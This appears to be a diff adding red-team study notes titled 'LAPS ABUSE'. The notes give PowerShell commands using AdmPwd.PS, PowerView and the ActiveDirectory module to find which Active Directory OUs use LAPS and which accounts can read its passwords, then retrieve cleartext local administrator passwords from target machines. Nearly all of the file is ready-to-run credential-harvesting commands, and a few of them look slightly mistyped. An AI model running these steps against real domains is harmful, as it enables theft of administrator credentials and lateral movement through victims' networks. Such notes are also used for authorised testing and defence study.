@@ -1,0 +1,30 @@
+LAPS ABUSE
+Enumerate on which OUs LAPS is in use and which users are allowed to read passwords:
+https://github.com/GreyCorbel/admpwd/tree/master/Main
+https://github.com/ztrhgf/LAPS/tree/master/AdmPwd.PS
+
+
+Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 
+
+Find-AdmPwdExtendedRights -Identity OUDistinguishedName  ****This has issues, use the command below if getting error messages
+
+Find-AdmPwdExtendedRights -Identity *
+
+Enumerate on which OUs LAPS is in use and which users are allowed to read passwords using Powerview
+
+Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' $(Convert-NameToSid $_.IdentityReference).SID; $_ }
+
+
+Use the following to read clear text LAPS Passwords via PowerView (Keep in mind you have to be in the context of someone with the privileges to read the LAPS passwords, gleaned from the commands above)
+
+Get-ADObject -SamAccountName <targetmachine$> | select ExpandProperty ms-mcs-admpwd 
+
+
+Use the following to read clear text LAPS Passwords via ActiveDirectory Module (Keep in mind you have to be in the context of someone with the privileges to read the LAPS passwords, gleaned from the commands above)
+
+Get-ADComputer -Identity <targetmachine> -Properties msmcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+
+Use the following to read clear text LAPS Passwords via LAPS Module (Keep in mind you have to be in the context of someone with the privileges to read the LAPS passwords, gleaned from the commands above)
+
+Get-AdmPwdPassword -ComputerName <targetmachine>
+
